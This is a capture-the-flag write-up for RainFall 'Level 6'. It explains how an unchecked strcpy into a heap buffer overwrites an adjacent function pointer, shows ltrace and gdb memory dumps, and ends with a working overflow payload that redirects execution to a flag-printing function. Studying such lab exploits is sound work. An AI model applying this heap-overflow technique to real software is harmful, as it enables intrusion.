# Level 6

In the source, we see two functions m and n.
In the main there is a function pointer being set to m which just prints "Nope". But n would print out the flag for us.
If only we could call it!

In comes strcpy to save the day.
Because the `char* dest` is located before our function pointer in memory, we can override it by overflowing the buffer.

As we can see, the strcpy copies over the entire argv[1] without checking the size.


We can get the return addresses from malloc by running `ltrace`.
```shell
level6@RainFall:~$ ltrace ./level6 
__libc_start_main(0x804847c, 1, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                      = 0x0804a008
malloc(4)                                                       = 0x0804a050
strcpy(0x0804a008, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
level6@RainFall:~$ 
```
*It segfaults because strcpy expects an argument from `argv`*

Let's try to write more data to our buffer and check what it does in memory:
```shell
level6@RainFall:~$ gdb -q level6 
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) b *main+78
Breakpoint 1 at 0x80484ca
(gdb) run $(python -c 'print 72*"A"')
Starting program: /home/user/level6/level6 $(python -c 'print 72*"A"')

Breakpoint 1, 0x080484ca in main ()
(gdb) x/40x 0x0804a008
0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x08048400	0x00000000
0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) 
```

We can see that after 72 characters we can rewrite the address of the following malloc region with what we want to call, let's do just that:
```shell
level6@RainFall:~$ ./level6 $(python -c 'print 72 * "A" + "\x54\x84\x04\x08"')
[...]
```
